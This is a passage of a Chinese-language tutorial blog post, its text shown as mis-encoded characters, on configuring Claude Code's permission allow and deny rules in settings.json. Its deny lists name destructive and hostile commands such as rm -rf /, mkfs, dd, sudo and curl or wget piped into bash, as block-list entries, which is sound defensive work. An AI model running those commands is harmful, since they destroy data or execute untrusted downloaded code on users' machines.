</ul>
</li>
<li><strong>Claude Code å†…ç½®å‘½ä»¤</strong>: ç›´æ¥è¾“å…¥å‘½ä»¤åï¼Œå¦‚ <code>WebFetch</code></li>
<li><strong>ç¬¬ä¸‰æ–¹å·¥å…·å‘½ä»¤</strong>: ç›´æ¥è¾“å…¥å‘½ä»¤åï¼Œå¦‚ <code>mcp__pencil</code></li>
</ul>
</li>
<li>æŒ‰ <strong>Enter</strong> ç¡®è®¤æ·»åŠ </li>
</ol>
<h4 data-id="heading-12">åˆ é™¤æƒé™è§„åˆ™</h4>
<ol>
<li>ä½¿ç”¨ <strong>â†‘/â†“</strong> é”®é€‰ä¸­è¦åˆ é™¤çš„è§„åˆ™</li>
<li>æŒ‰ <strong>Enter</strong> é”®</li>
<li>ä¼šå¼¹å‡ºåˆ é™¤ç¡®è®¤å¯¹è¯æ¡†ï¼š"Delete allowed tool?" æˆ–ç±»ä¼¼æç¤º</li>
<li>é€‰æ‹© <strong>"Yes"</strong> ç¡®è®¤åˆ é™¤ï¼Œæˆ– <strong>"No"</strong> å–æ¶ˆ</li>
<li>æŒ‰ <strong>Esc</strong> å¯ä»¥éšæ—¶å–æ¶ˆæ“ä½œ</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6de8903e9166458c8a802ae35d9a1887~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=2PFhRL5s6WHpZWOx9DJnA3%2FaMAo%3D" alt="04-05-permissions-delete.png" loading="lazy"/></p>
<h4 data-id="heading-13">æœç´¢å‘½ä»¤</h4>
<ul>
<li>ç•Œé¢é¡¶éƒ¨æœ‰ <strong>Search</strong> æœç´¢æ¡†</li>
<li>ç›´æ¥è¾“å…¥å…³é”®å­—å³å¯è¿‡æ»¤æ˜¾ç¤ºåŒ¹é…çš„å‘½ä»¤è§„åˆ™</li>
<li>æ”¯æŒæ¨¡ç³Šæœç´¢ï¼Œæ–¹ä¾¿åœ¨å¤§é‡è§„åˆ™ä¸­å¿«é€Ÿå®šä½</li>
</ul>
<h4 data-id="heading-14">å¯¼èˆªå¿«æ·é”®</h4>
<ul>
<li><strong>â†‘/â†“</strong> - ä¸Šä¸‹å¯¼èˆªè§„åˆ™åˆ—è¡¨</li>
<li><strong>â†/â†’</strong> æˆ– <strong>Tab</strong> - åˆ‡æ¢æƒé™ç±»åˆ«ï¼ˆAllow/Ask/Denyï¼‰</li>
<li><strong>Enter</strong> - é€‰æ‹©/ç¡®è®¤æ“ä½œ</li>
<li><strong>Esc</strong> - å–æ¶ˆæ“ä½œ/é€€å‡ºç•Œé¢</li>
<li><strong>è¾“å…¥æ–‡å­—</strong> - åœ¨æœç´¢æ¡†ä¸­æœç´¢</li>
</ul>
<h3 data-id="heading-15">2.3 æƒé™é…ç½®æ–‡ä»¶</h3>
<p>æƒé™é…ç½®å¯ä»¥æŒä¹…åŒ–åˆ°é…ç½®æ–‡ä»¶ä¸­,æ— éœ€æ¯æ¬¡æ‰‹åŠ¨è®¾ç½®ã€‚æˆ‘æ›´æ¨èé€šè¿‡é…ç½®æ–‡ä»¶çš„æ–¹å¼ä¿®æ”¹ï¼Œå¯ä»¥å®ç°æ‰¹é‡å¯å¤åˆ¶çš„é…ç½®ï¼Œé¿å…ä¸€ä¸ªä¸ªæ‰‹åŠ¨æ·»åŠ ã€‚</p>
<p><strong>å…¨å±€é…ç½®</strong> (~/.claude/settings.json):</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(cat:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(ls:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(grep:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:log:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:diff:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(npm:test)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(npm:run:lint)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(rm:-rf:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(sudo:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(mkfs:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(dd:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(curl:*:|:bash)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(wget:*:|:sh)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(reboot)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(shutdown:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>é¡¹ç›®çº§é…ç½®</strong> (é¡¹ç›®æ ¹ç›®å½•/.claude/settings.json æˆ– .claude/settings.local.json):</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(npm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(yarn:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:ps)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:logs:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(docker:rm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:rmi:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>é…ç½®ä¼˜å…ˆçº§</strong>:</p>
<pre><code class="hljs language-makefile" lang="makefile">é¡¹ç›®é…ç½® &gt; å…¨å±€é…ç½® &gt; é»˜è®¤ç­–ç•¥

<span class="hljs-section">ç¤ºä¾‹:</span>
  å…¨å±€é…ç½®: deny <span class="hljs-string">"sudo *"</span>
  é¡¹ç›®é…ç½®: allow <span class="hljs-string">"sudo npm install"</span>
  æœ€ç»ˆç»“æœ: é¡¹ç›®ä¸­å…è®¸ <span class="hljs-string">"sudo npm install"</span>,å…¶ä»– sudo å‘½ä»¤ä»è¢«é˜»æ–­
</code></pre>
<h3 data-id="heading-16">2.4 æƒé™çš„ä½œç”¨åŸŸä¸æŒä¹…åŒ–</h3>
<p><strong>ä½œç”¨åŸŸ</strong>:</p>

























<table><thead><tr><th align="left">é…ç½®ç±»å‹</th><th align="left">ä½œç”¨åŸŸ</th><th align="left">é…ç½®æ–‡ä»¶</th></tr></thead><tbody><tr><td align="left"><strong>å…¨å±€é…ç½®</strong></td><td align="left">æ‰€æœ‰é¡¹ç›®</td><td align="left"><code>~/.claude/settings.json</code></td></tr><tr><td align="left"><strong>é¡¹ç›®é…ç½®</strong></td><td align="left">å½“å‰é¡¹ç›®</td><td align="left"><code>&lt;é¡¹ç›®æ ¹&gt;/.claude/settings.json</code> æˆ– <code>.claude/settings.local.json</code></td></tr><tr><td align="left"><strong>ä¼šè¯é…ç½®</strong></td><td align="left">å½“å‰ä¼šè¯</td><td align="left">ä»…å†…å­˜ä¸­,é€€å‡ºå¤±æ•ˆ</td></tr></tbody></table>
<p><strong>æŒä¹…åŒ–ç­–ç•¥</strong>:</p>
<p>é€šè¿‡ <code>/permissions</code> ç•Œé¢é…ç½®çš„æƒé™è§„åˆ™ä¼šè‡ªåŠ¨ä¿å­˜ï¼š</p>
<ol>
<li><strong>å…¨å±€é…ç½®</strong>: ä¿å­˜åœ¨ <code>~/.claude/settings.json</code>ï¼Œæ‰€æœ‰é¡¹ç›®ç”Ÿæ•ˆ</li>
<li><strong>é¡¹ç›®é…ç½®</strong>: ä¿å­˜åœ¨ <code>&lt;é¡¹ç›®æ ¹&gt;/.claude/settings.local.json</code>ï¼Œä»…å½“å‰é¡¹ç›®ç”Ÿæ•ˆ</li>
<li><strong>å·¥ä½œåŒºé…ç½®</strong>: é€šè¿‡ <strong>Workspace</strong> ç±»åˆ«é…ç½®ï¼Œé¡¹ç›®çº§åˆ«ç”Ÿæ•ˆ</li>
</ol>
<h3 data-id="heading-17">2.5 æœ€ä½³å®è·µé…ç½®å‚è€ƒæ¸…å•</h3>
<p>åœ¨äº†è§£äº†æƒé™é…ç½®çš„ä½œç”¨åŸŸå’ŒæŒä¹…åŒ–æœºåˆ¶åï¼Œä»¥ä¸‹æ˜¯ä¸€ä»½å®ç”¨çš„é…ç½®å‚è€ƒæ¸…å•ï¼Œå¸®åŠ©ä½ å¿«é€Ÿé…ç½®å¸¸ç”¨å‘½ä»¤çš„æƒé™ã€‚</p>
<h4 data-id="heading-18">2.5.1 Allow ç±»åˆ«æ¨èé…ç½®ï¼ˆå®‰å…¨å‘½ä»¤ç™½åå•ï¼‰</h4>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„å®‰å…¨å‘½ä»¤ï¼Œå»ºè®®æ·»åŠ åˆ° <strong>Allow</strong> ç±»åˆ«ä¸­ï¼Œä»¥ä¾¿ç›´æ¥æ‰§è¡Œæ— éœ€ç¡®è®¤ï¼š</p>
<p><strong>æ–‡ä»¶æŸ¥çœ‹ç±»ï¼ˆåªè¯»æ“ä½œï¼Œå®‰å…¨ï¼‰</strong></p>
<ul>
<li><code>Bash(cat:*)</code> - æŸ¥çœ‹æ–‡ä»¶å†…å®¹</li>
<li><code>Bash(less:*)</code> - åˆ†é¡µæŸ¥çœ‹æ–‡ä»¶</li>
<li><code>Bash(head:*)</code> - æŸ¥çœ‹æ–‡ä»¶å¼€å¤´</li>
<li><code>Bash(tail:*)</code> - æŸ¥çœ‹æ–‡ä»¶æœ«å°¾</li>
</ul>
<p><strong>æ–‡ä»¶åˆ—è¡¨ç±»ï¼ˆåªè¯»ï¼Œå®‰å…¨ï¼‰</strong></p>
<ul>
<li><code>Bash(ls:*)</code> - åˆ—å‡ºç›®å½•å†…å®¹</li>
<li><code>Bash(tree:*)</code> - æ ‘å½¢æ˜¾ç¤ºç›®å½•ç»“æ„</li>
<li><code>Bash(find:*)</code> - æŸ¥æ‰¾æ–‡ä»¶</li>
</ul>
<p><strong>æ–‡æœ¬æœç´¢ç±»ï¼ˆåªè¯»ï¼Œå®‰å…¨ï¼‰</strong></p>
<ul>
<li><code>Bash(grep:*)</code> - æ–‡æœ¬æœç´¢</li>
<li><code>Bash(rg:*)</code> - ripgrep å¿«é€Ÿæœç´¢</li>
<li><code>Bash(ag:*)</code> - The Silver Searcher</li>
</ul>
<p><strong>Git æŸ¥çœ‹ç±»ï¼ˆåªè¯»ï¼Œå®‰å…¨ï¼‰</strong></p>
<ul>
<li><code>Bash(git:status)</code> - æŸ¥çœ‹ Git çŠ¶æ€</li>
<li><code>Bash(git:log:*)</code> - æŸ¥çœ‹æäº¤å†å²</li>
<li><code>Bash(git:diff:*)</code> - æŸ¥çœ‹å·®å¼‚</li>
<li><code>Bash(git:show:*)</code> - æŸ¥çœ‹æäº¤è¯¦æƒ…</li>
<li><code>Bash(git:branch)</code> - æŸ¥çœ‹åˆ†æ”¯</li>
</ul>
<p><strong>è¿›ç¨‹æŸ¥çœ‹ç±»ï¼ˆåªè¯»ï¼Œå®‰å…¨ï¼‰</strong></p>
<ul>
<li><code>Bash(ps:*)</code> - æŸ¥çœ‹è¿›ç¨‹</li>
<li><code>Bash(top)</code> - å®æ—¶è¿›ç¨‹ç›‘æ§</li>
<li><code>Bash(htop)</code> - å¢å¼ºç‰ˆè¿›ç¨‹ç›‘æ§</li>
</ul>
<p><strong>ç½‘ç»œæŸ¥çœ‹ç±»ï¼ˆåªè¯»ï¼Œå®‰å…¨ï¼‰</strong></p>
<ul>
<li><code>Bash(ping:*)</code> - ç½‘ç»œè¿é€šæ€§æµ‹è¯•</li>
<li><code>Bash(curl:--head:*)</code> - åªè·å– HTTP headerï¼Œä¸ä¸‹è½½å†…å®¹</li>
</ul>
<p><strong>é…ç½®æ–¹å¼</strong>:</p>
<ol>
<li>
<p><strong>é€šè¿‡ <code>/permissions</code> ç•Œé¢æ·»åŠ </strong>:</p>
<ul>
<li>è¾“å…¥ <code>/permissions</code> æ‰“å¼€æƒé™ç®¡ç†ç•Œé¢</li>
<li>åˆ‡æ¢åˆ° <strong>Allow</strong> ç±»åˆ«</li>
<li>é€‰æ‹© "Add a new rule..."</li>
<li>ä¾æ¬¡è¾“å…¥ä¸Šè¿°å‘½ä»¤æ ¼å¼ï¼ˆå¦‚ <code>Bash(cat:*)</code>ï¼‰</li>
<li>æŒ‰ Enter ç¡®è®¤æ·»åŠ </li>
</ul>
</li>
<li>
<p><strong>é€šè¿‡é…ç½®æ–‡ä»¶æ‰¹é‡æ·»åŠ </strong>ï¼ˆæ¨èï¼‰:</p>
<ul>
<li>ç¼–è¾‘ <code>~/.claude/settings.json</code> æˆ– <code>.claude/settings.local.json</code></li>
<li>åœ¨ <code>permissions.allow</code> æ•°ç»„ä¸­æ·»åŠ ä¸Šè¿°å‘½ä»¤</li>
<li>ä¿å­˜åé…ç½®è‡ªåŠ¨ç”Ÿæ•ˆ</li>
</ul>
</li>
</ol>
<h4 data-id="heading-19">2.5.2 Deny ç±»åˆ«æ¨èé…ç½®ï¼ˆé«˜å±å‘½ä»¤é»‘åå•ï¼‰</h4>
<p>å»ºè®®å°†ä»¥ä¸‹å±é™©å‘½ä»¤æ·»åŠ åˆ° <strong>Deny</strong> ç±»åˆ«ä¸­ï¼Œå®Œå…¨é˜»æ­¢æ‰§è¡Œï¼š</p>
<p><strong>æ–‡ä»¶åˆ é™¤ç±»ï¼ˆç ´åæ€§ï¼‰</strong></p>
<ul>
<li><code>Bash(rm:-rf:*)</code> - é€’å½’åˆ é™¤æ–‡ä»¶</li>
<li><code>Bash(rm:-rf:/)</code> - åˆ é™¤æ ¹ç›®å½•ï¼ˆæå…¶å±é™©ï¼‰</li>
<li><code>Bash(rm:-rf:~)</code> - åˆ é™¤ç”¨æˆ·ä¸»ç›®å½•</li>
<li><code>Bash(sudo:rm:*)</code> - ä½¿ç”¨ sudo åˆ é™¤æ–‡ä»¶</li>
</ul>
<p><strong>ç£ç›˜æ“ä½œç±»ï¼ˆä¸å¯é€†ï¼‰</strong></p>
<ul>
<li><code>Bash(mkfs:*)</code> - æ ¼å¼åŒ–æ–‡ä»¶ç³»ç»Ÿ</li>
<li><code>Bash(dd:*)</code> - ç£ç›˜å¤åˆ¶ï¼ˆå¯èƒ½è¦†ç›–æ•°æ®ï¼‰</li>
<li><code>Bash(fdisk:*)</code> - ç£ç›˜åˆ†åŒºå·¥å…·</li>
</ul>
<p><strong>æƒé™æå‡ç±»ï¼ˆå®‰å…¨é£é™©ï¼‰</strong></p>
<ul>
<li><code>Bash(sudo:*)</code> - æ‰€æœ‰ sudo å‘½ä»¤</li>
<li><code>Bash(su:*)</code> - åˆ‡æ¢ç”¨æˆ·</li>
<li><code>Bash(chmod:777:*)</code> - è®¾ç½®å±é™©æƒé™</li>
</ul>
<p><strong>ç½‘ç»œä¸‹è½½æ‰§è¡Œç±»ï¼ˆæ¶æ„è½¯ä»¶é£é™©ï¼‰</strong></p>
<ul>
<li><code>Bash(curl:*:|:bash)</code> - ä¸‹è½½å¹¶æ‰§è¡Œè„šæœ¬</li>
<li><code>Bash(curl:*:|:sh)</code> - ä¸‹è½½å¹¶æ‰§è¡Œ shell è„šæœ¬</li>
<li><code>Bash(wget:*:|:bash)</code> - wget ä¸‹è½½å¹¶æ‰§è¡Œ</li>
<li><code>Bash(wget:*:|:sh)</code> - wget ä¸‹è½½å¹¶æ‰§è¡Œ shell</li>
</ul>
<p><strong>ç³»ç»Ÿå…³é”®æ“ä½œï¼ˆå±é™©ï¼‰</strong></p>
<ul>
<li><code>Bash(reboot)</code> - é‡å¯ç³»ç»Ÿ</li>
<li><code>Bash(shutdown:*)</code> - å…³é—­ç³»ç»Ÿ</li>
<li><code>Bash(init:0)</code> - ç³»ç»Ÿå…³æœº</li>
</ul>
<p><strong>é…ç½®æ–¹å¼</strong>:</p>
<ol>
<li>
<p><strong>é€šè¿‡ <code>/permissions</code> ç•Œé¢æ·»åŠ </strong>:</p>
<ul>
<li>è¾“å…¥ <code>/permissions</code> æ‰“å¼€æƒé™ç®¡ç†ç•Œé¢</li>
<li>åˆ‡æ¢åˆ° <strong>Deny</strong> ç±»åˆ«</li>
<li>é€‰æ‹© "Add a new rule..."</li>
<li>ä¾æ¬¡è¾“å…¥ä¸Šè¿°å‘½ä»¤æ ¼å¼ï¼ˆå¦‚ <code>Bash(rm:-rf:*)</code>ï¼‰</li>
<li>æŒ‰ Enter ç¡®è®¤æ·»åŠ </li>
</ul>
</li>
<li>
<p><strong>é€šè¿‡é…ç½®æ–‡ä»¶æ‰¹é‡æ·»åŠ </strong>ï¼ˆæ¨èï¼‰:</p>
<ul>
<li>ç¼–è¾‘ <code>~/.claude/settings.json</code> æˆ– <code>.claude/settings.local.json</code></li>
<li>åœ¨ <code>permissions.deny</code> æ•°ç»„ä¸­æ·»åŠ ä¸Šè¿°å‘½ä»¤</li>
<li>ä¿å­˜åé…ç½®è‡ªåŠ¨ç”Ÿæ•ˆ</li>
</ul>
</li>
</ol>
<p><strong>æ³¨æ„</strong>: å‘½ä»¤æ ¼å¼ä¸­ä½¿ç”¨å†’å· <code>:</code> åˆ†éš”å‘½ä»¤å’Œå‚æ•°ï¼Œè€Œä¸æ˜¯ç©ºæ ¼ã€‚ä¾‹å¦‚ <code>Bash(rm:-rf:*)</code> è¡¨ç¤º <code>rm -rf *</code> å‘½ä»¤ã€‚</p>
<hr/>
<h2 data-id="heading-20">ä¸‰ã€å¸¸è§é—®é¢˜ä¸è°ƒè¯•æŠ€å·§</h2>
<h3 data-id="heading-21">3.1 æƒé™é…ç½®ä¸ç”Ÿæ•ˆ</h3>
<p><strong>é—®é¢˜</strong>: é…ç½®äº†ç™½åå•,ä½† AI ä»ç„¶è¦æ±‚ç¡®è®¤</p>
<p><strong>æ’æŸ¥æ­¥éª¤</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æ£€æŸ¥é…ç½®æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-built_in">ls</span> -la ~/.claude/settings.json
<span class="hljs-built_in">ls</span> -la ./.claude/settings.local.json

<span class="hljs-comment"># 2. æ£€æŸ¥ JSON æ ¼å¼æ˜¯å¦æ­£ç¡®</span>
jq . ~/.claude/settings.json
jq . ./.claude/settings.local.json

<span class="hljs-comment"># 3. æŸ¥çœ‹å½“å‰ç”Ÿæ•ˆçš„æƒé™</span>
<span class="hljs-comment"># åœ¨ Claude Code äº¤äº’å¼ç»ˆç«¯ä¸­è¾“å…¥:</span>
&gt; /permissions
<span class="hljs-comment"># ç„¶ååˆ‡æ¢åˆ° Allow/Ask/Deny ç±»åˆ«æŸ¥çœ‹å¯¹åº”æƒé™è§„åˆ™</span>

<span class="hljs-comment"># 4. æ£€æŸ¥å‘½ä»¤æ¨¡å¼æ˜¯å¦åŒ¹é…</span>
<span class="hljs-comment"># ä¾‹å¦‚: é…ç½®äº† "npm test" ä½†å®é™…æ‰§è¡Œ "npm test --verbose"</span>
<span class="hljs-comment"># è§£å†³: æ”¹ä¸º "Bash(npm:test:*)" æˆ– "Bash(npm:test:*)"</span>
</code></pre>
<p><strong>å¸¸è§é”™è¯¯</strong>:</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// âŒ é”™è¯¯: æ¨¡å¼ä¸åŒ¹é…</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
<span class="hljs-comment">// AI æ‰§è¡Œ: git status -sb (ä¸åŒ¹é…)</span>

<span class="hljs-comment">// âœ… æ­£ç¡®: ä½¿ç”¨é€šé…ç¬¦</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"Bash(git:status:*)"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-22">3.2 é…ç½®æ–‡ä»¶æ ¼å¼é”™è¯¯</h3>
<p><strong>é—®é¢˜</strong>: é…ç½®æ–‡ä»¶æ ¼å¼ä¸æ­£ç¡®,å¯¼è‡´æƒé™æ— æ³•åŠ è½½</p>
<p><strong>æ’æŸ¥æ­¥éª¤</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. ä½¿ç”¨ jq éªŒè¯ JSON æ ¼å¼</span>
jq . ~/.claude/settings.json

<span class="hljs-comment"># 2. æ£€æŸ¥å‘½ä»¤æ ¼å¼æ˜¯å¦æ­£ç¡®</span>
<span class="hljs-comment"># æ­£ç¡®æ ¼å¼: "Bash(å‘½ä»¤:å‚æ•°)"</span>
<span class="hljs-comment"># é”™è¯¯æ ¼å¼: "bash command" æˆ– "Bash(command param)"</span>
</code></pre>
<hr/>
<h2 data-id="heading-23">å››ã€æ€»ç»“ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-24">4.1 æ ¸å¿ƒè¦ç‚¹å›é¡¾</h3>
<p>é€šè¿‡æœ¬æ–‡,æˆ‘ä»¬æ·±å…¥æ¢è®¨äº† Claude Code çš„æƒé™ç®¡ç†ç³»ç»Ÿ:</p>
<p><strong>æƒé™ç®¡ç†(Permission)</strong></p>
<ul>
<li><strong>å¿…è¦æ€§</strong>: å¹³è¡¡å®‰å…¨ä¸æ•ˆç‡,æ—¢é˜²æ­¢å±é™©æ“ä½œ,åˆé¿å…é‡å¤ç¡®è®¤</li>
<li><strong>æœºåˆ¶</strong>: ç™½åå• + é»‘åå• + é»˜è®¤ç­–ç•¥</li>
<li><strong>é…ç½®</strong>: å…¨å±€é…ç½® + é¡¹ç›®é…ç½®,ä¼˜å…ˆçº§æ˜ç¡®</li>
<li><strong>å®è·µ</strong>: æ‰¹é‡æˆæƒå®‰å…¨å‘½ä»¤,é˜»æ–­å±é™©æ“ä½œ</li>
</ul>
<p><strong>é‡‘å¥å›é¡¾</strong>:</p>
<blockquote>
<p>"Permission æƒé™ç®¡ç†:æ—¢ä¿éšœå®‰å…¨,åˆä½¿ç”¨ä¸æ»‘"</p>
</blockquote>
<h3 data-id="heading-25">4.2 æœ€ä½³å®è·µæ¸…å•</h3>
<p><strong>æƒé™é…ç½®æœ€ä½³å®è·µ</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown">âœ… DO(æ¨èåšæ³•)
<span class="hljs-bullet">-</span> æ‰¹é‡æˆæƒå¸¸ç”¨å®‰å…¨å‘½ä»¤(catã€lsã€grepã€git status ç­‰)
<span class="hljs-bullet">-</span> é˜»æ–­é«˜å±å‘½ä»¤(rm -rfã€sudoã€mkfsã€dd ç­‰)
<span class="hljs-bullet">-</span> é¡¹ç›®é…ç½®æäº¤åˆ° Git,å›¢é˜Ÿå…±äº«
<span class="hljs-bullet">-</span> å®šæœŸå›é¡¾å’Œæ›´æ–°æƒé™è§„åˆ™
<span class="hljs-bullet">-</span> ä½¿ç”¨æ¨¡å¼åŒ¹é…è€Œä¸æ˜¯ç²¾ç¡®åŒ¹é…(çµæ´»æ€§)

âŒ DON'T(é¿å…çš„åšæ³•)
<span class="hljs-bullet">-</span> ä¸€åˆ€åˆ‡ç¦æ­¢æ‰€æœ‰å‘½ä»¤(å½±å“æ•ˆç‡)
<span class="hljs-bullet">-</span> ç™½åå•åŒ…å«å±é™©å‘½ä»¤(å®‰å…¨éšæ‚£)
<span class="hljs-bullet">-</span> å¿˜è®°é…ç½®æƒé™æŒä¹…åŒ–(æ¯æ¬¡é‡æ–°è®¾ç½®)
<span class="hljs-bullet">-</span> è¿‡äºå¤æ‚çš„æ¨¡å¼åŒ¹é…(éš¾ä»¥ç»´æŠ¤)
</code></pre>
<p><strong>å®‰å…¨é…ç½®æœ€ä½³å®è·µ</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown">âœ… DO(æ¨èåšæ³•)
<span class="hljs-bullet">-</span> é»‘åå•ä¼˜å…ˆçº§é«˜äºç™½åå•
<span class="hljs-bullet">-</span> å±é™©å‘½ä»¤å®Œå…¨ç¦æ­¢,ä¸æä¾›ç¡®è®¤é€‰é¡¹
<span class="hljs-bullet">-</span> å®šæœŸå®¡è®¡ AI æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-bullet">-</span> é…ç½®æ–‡ä»¶æƒé™è®¾ç½®ä¸º 600(ä»…è‡ªå·±å¯è¯»å†™)

âŒ DON'T(é¿å…çš„åšæ³•)
<span class="hljs-bullet">-</span> ä¸ºäº†æ–¹ä¾¿å°†æ‰€æœ‰å‘½ä»¤åŠ å…¥ç™½åå•
<span class="hljs-bullet">-</span> å¿½ç•¥æƒé™é…ç½®çš„å®‰å…¨è­¦å‘Š
<span class="hljs-bullet">-</span> ä½¿ç”¨æ˜æ–‡å­˜å‚¨æ•æ„Ÿä¿¡æ¯
</code></pre>
<h3 data-id="heading-26">4.3 å¿«é€Ÿé…ç½®æŒ‡å—</h3>
<p><strong>ç¬¬ 1 æ­¥: åˆ›å»ºé…ç½®æ–‡ä»¶(ä»Šå¤©å®Œæˆ)</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. åˆ›å»ºç›®å½•</span>
<span class="hljs-built_in">mkdir</span> -p ~/.claude

<span class="hljs-comment"># 2. åˆ›å»ºå…¨å±€é…ç½®æ–‡ä»¶</span>
<span class="hljs-built_in">cat</span> &gt; ~/.claude/settings.json &lt;&lt; <span class="hljs-string">EOF
{
  "permissions": {
    "allow": [
      "Bash(cat:*)",
      "Bash(ls:*)",
      "Bash(grep:*)",
      "Bash(git:status)",
      "Bash(git:log:*)",
      "Bash(git:diff:*)"
    ],
    "deny": [
      "Bash(rm:-rf:*)",
      "Bash(sudo:*)",
      "Bash(mkfs:*)"
    ]
  }
}
EOF</span>
</code></pre>
<p><strong>ç¬¬ 2 æ­¥: éªŒè¯é…ç½®(ä»Šå¤©å®Œæˆ)</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å¯åŠ¨ Claude Code</span>
claude

<span class="hljs-comment"># 2. æŸ¥çœ‹æƒé™é…ç½®</span>
&gt; /permissions
<span class="hljs-comment"># æ‰“å¼€æƒé™ç®¡ç†ç•Œé¢ï¼Œåˆ‡æ¢åˆ° Allow/Ask/Deny ç±»åˆ«æŸ¥çœ‹å¯¹åº”æƒé™</span>

<span class="hljs-comment"># 3. æµ‹è¯•å®‰å…¨å‘½ä»¤(åº”è¯¥ç›´æ¥æ‰§è¡Œ,æ— éœ€ç¡®è®¤)</span>
&gt; æŸ¥çœ‹ README.md

<span class="hljs-comment"># 4. æµ‹è¯•å±é™©å‘½ä»¤æ‹¦æˆª</span>
&gt; æ‰§è¡Œ <span class="hljs-built_in">rm</span> -rf <span class="hljs-built_in">test</span>
<span class="hljs-comment"># [åº”è¯¥è¢«é˜»æ–­]</span>
</code></pre>
<h3 data-id="heading-27">4.4 å¸¸è§é…ç½®æ¨¡æ¿</h3>
<p><strong>æ¨¡æ¿ 1: Web å¼€å‘é¡¹ç›®</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(npm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(yarn:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(pnpm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:log:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:diff:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:ps)"</span><span class="hljs-punctuation">,</span>
